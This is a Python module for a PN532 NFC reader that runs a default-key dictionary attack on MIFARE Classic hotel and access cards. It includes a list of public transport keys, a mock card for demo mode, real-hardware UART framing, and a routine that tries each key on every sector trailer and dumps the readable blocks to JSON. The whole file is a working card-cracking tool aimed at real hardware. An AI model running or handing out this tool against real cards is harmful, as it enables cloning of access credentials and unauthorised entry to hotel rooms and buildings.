"""13.56 MHz NFC — MIFARE Classic hotel-card attacks via PN532.

The heart is the default-key dictionary attack: most hotel/access cards keep
manufacturer or weak transport keys, so we walk a public default-key list
against every sector trailer and dump whatever opens. Works against real
PN532 UART hardware or the bundled virtual card (demo mode).
"""

from __future__ import annotations

import json
import os
import time

# Public default / transport keys (12 hex chars each). User-expandable —
# common defaults found on hotel cards, transport cards and never-changed
# installations.
DEFAULT_KEYS = [
    "FFFFFFFFFFFF",  # MIFARE default (most common hotel key mistake)
    "000000000000",  # blank
    "A0A1A2A3A4A5",  # MAD sector 0 (public application directory)
    "B0B1B2B3B4B5",
    "D3F7D3F7D3F7",  # MAD transport
    "A0B0C0D0E0F0",
    "123456789ABC",
    "ABCDEF123456",
    "010203040506",
    "0A0B0C0D0E0F",
    "001122334455",
    "112233445566",
    "414243444546",  # ASCII "ABCDEF"
    "4D3A99C351DD",  # seen on transport cards
    "1A2B3C4D5E6F",
    "696969696969",
    "BADBADBADBAD",
    "CAFEBABECAFE",
    "A5B4C3D2E1F0",
    "0012345678AB",
]


# ---------------------------------------------------------------------------
# card interface — real (PN532) and mock share the same attack code
# ---------------------------------------------------------------------------

class MifareCard:
    """A MIFARE Classic card visible through auth/read_block."""

    SECTORS = 16
    BLOCKS_PER_SECTOR = 4

    def auth(self, block: int, key_a: bool, key: bytes) -> bool:
        raise NotImplementedError

    def read_block(self, block: int) -> bytes:
        raise NotImplementedError

    def uid(self) -> bytes:
        return b""


class MockMifare(MifareCard):
    """Virtual MIFARE Classic 1K hotel card (deterministic, demo mode).

    Sectors 0+1 use default keys the dictionary attack finds instantly;
    sector 2 uses a custom key only the *owner* knows (shows the limit);
    the rest default back to FFFFFFFFFFFF.
    """

    def __init__(self, uid: bytes = b"\x04\x1A\x2B\x3C"):
        self._uid = uid
        self._authed_sector = None
        self._keys = {
            s: (bytes.fromhex("FFFFFFFFFFFF"), bytes.fromhex("FFFFFFFFFFFF"))
            for s in range(self.SECTORS)
        }
        self._keys[1] = (bytes.fromhex("A0A1A2A3A4A5"),  # MAD key A
                         bytes.fromhex("B5B5B5B5B5B5"))  # custom B
        self._keys[2] = (bytes.fromhex("CAFEF00DBEEF"),  # custom
                         bytes.fromhex("314159265358"))  # also custom
        self._blocks = {}
        for s in range(self.SECTORS):
            for b in range(self.BLOCKS_PER_SECTOR):
                addr = s * 4 + b
                if b == 3:  # trailer: keyA + access + keyB, 16 bytes
                    ka, kb = self._keys[s]
                    trailer = ka + bytes([0x78, 0x77, 0x88, 0x00]) + kb
                    self._blocks[addr] = trailer[:16].ljust(16, b"\x00")
                else:
                    tag = f"SECTOR-{s:02d}-BLOCK-{b}".encode()
                    self._blocks[addr] = tag.ljust(16, b".")

    def uid(self) -> bytes:
        return self._uid

    def auth(self, block: int, key_a: bool, key: bytes) -> bool:
        sector = block // self.BLOCKS_PER_SECTOR
        ka, kb = self._keys.get(sector, (b"\x00" * 6, b"\x00" * 6))
        ok = (bytes(key) == ka) if key_a else (bytes(key) == kb)
        self._authed_sector = sector if ok else None
        return ok

    def read_block(self, block: int) -> bytes:
        if self._authed_sector != block // self.BLOCKS_PER_SECTOR:
            raise PermissionError("block not authenticated")
        data = bytearray(self._blocks[block])
        if block % self.BLOCKS_PER_SECTOR == 3:
            # real cards never reveal the keys on read
            data[0:6] = b"\x00" * 6
            data[10:16] = b"\x00" * 6
        return bytes(data)


class Pn532Mifare(MifareCard):
    """Real MIFARE Classic via a PN532 UART board (InDataExchange)."""

    def __init__(self, pn532, uid: bytes):
        self.pn532 = pn532
        self._uid = uid
        self._authed_sector = None

    def uid(self) -> bytes:
        return self._uid

    def auth(self, block: int, key_a: bool, key: bytes) -> bool:
        cmd = [0x60 if key_a else 0x61, block] + list(key) + list(self._uid)
        resp = self.pn532.in_data_exchange(cmd)
        ok = bool(resp) and resp[0] == 0x14  # PN532 auth-ok status
        self._authed_sector = (block // self.BLOCKS_PER_SECTOR) if ok else None
        return ok

    def read_block(self, block: int) -> bytes:
        if self._authed_sector != block // self.BLOCKS_PER_SECTOR:
            raise PermissionError("block not authenticated")
        resp = self.pn532.in_data_exchange([0x30, block])
        return bytes(resp[1:17])

# ---------------------------------------------------------------------------
# the attack
# ---------------------------------------------------------------------------

def dump_classic(card: MifareCard, keys=None, on_progress=None) -> dict:
    """Dictionary-attack every sector trailer and dump whatever opens.

    Returns {"uid", "sectors": {sector: {"key", "key_a", "blocks"}}}.
    Unknown-key sectors are simply skipped (the honest limit).
    """
    if keys is None:
        keys = [bytes.fromhex(k) for k in DEFAULT_KEYS]
    result = {"uid": card.uid().hex().upper(), "sectors": {}}
    for sector in range(card.SECTORS):
        trailer = sector * card.BLOCKS_PER_SECTOR + 3
        found = None
        for key in keys:
            for key_a in (True, False):
                try:
                    if card.auth(trailer, key_a, key):
                        found = (key, key_a)
                        break
                except Exception:
                    pass
            if found:
                break
        if on_progress is not None:
            on_progress(sector + 1, card.SECTORS,
                        found[0].hex().upper() if found else None)
        if not found:
            continue
        blocks = {}
        for b in range(sector * card.BLOCKS_PER_SECTOR,
                       (sector + 1) * card.BLOCKS_PER_SECTOR):
            try:
                blocks[b] = card.read_block(b).hex().upper()
            except Exception:
                break
        result["sectors"][sector] = {
            "key": found[0].hex().upper(),
            "key_a": found[1],
            "blocks": blocks,
        }
    return result


def save_dump(path: str, dump: dict) -> str:
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(dump, fh, indent=1)
    return path


# ---------------------------------------------------------------------------
# PN532 transport (UART, real hardware) — frames: 00 FF LEN LCS D4 CMD DCS 00
# ---------------------------------------------------------------------------

class PN532:
    def __init__(self, transport):
        self.transport = transport

    def _send(self, payload: list[int]) -> list[int]:
        tfi = 0xD4
        data = [tfi] + payload
        lcs = -(0xFF + sum(data)) & 0xFF
        frame = [0x00, 0xFF, len(data), lcs] + data
        dcs = -(sum(data)) & 0xFF
        frame += [dcs, 0x00]
        resp = self.transport.xfer(bytes(frame))
        return self._payload(resp)

    @staticmethod
    def _payload(resp: bytes) -> list[int]:
        # find PN532 frame start: 00 FF LEN LCS ...
        i = 0
        while i < len(resp) - 5:
            if resp[i] == 0x00 and resp[i + 1] == 0xFF:
                length = resp[i + 2]
                body = resp[i + 5:i + 5 + length]  # skip LCS
                return list(body)
            i += 1
        return list(resp)

    def get_firmware(self) -> str:
        resp = self._send([0x02])
        if len(resp) >= 5:
            return (f"PN532 v{resp[1]}.{resp[2]} "
                    f"(IC {resp[0]:02X}, {resp[3]:02X}{resp[4]:02X})")
        return "PN532"

    def sam_config(self) -> None:
        self._send([0x14, 0x01])

    def read_passive_target(self) -> bytes:
        """InListPassiveTarget (106 kbps type A) -> card UID."""
        resp = self._send([0x4A, 0x01, 0x00])
        if len(resp) >= 6 and resp[0] == 0x4B and resp[1] > 0:
            uid_len = resp[5]
            return bytes(resp[6:6 + uid_len])
        return b""

    def in_data_exchange(self, cmd: list[int]) -> list[int]:
        return self._send([0x40, 0x01] + cmd)


class SerialTransport:
    """pyserial bridge for a PN532 on the Pi's UART."""

    def __init__(self, port: str, baud: int = 115200):
        import serial  # only needed for real hardware
        self.ser = serial.Serial(port, baud, timeout=1)

    def xfer(self, frame: bytes) -> bytes:
        self.ser.write(frame)
        # swallow the ACK preamble (00 FF 00 FF), then read the response
        deadline = time.monotonic() + 1.0
        buf = b""
        while time.monotonic() < deadline:
            buf += self.ser.read(64)
            if b"\x00\xff" in buf and len(buf) > 6:
                return buf
        return buf

    def close(self):
        self.ser.close()

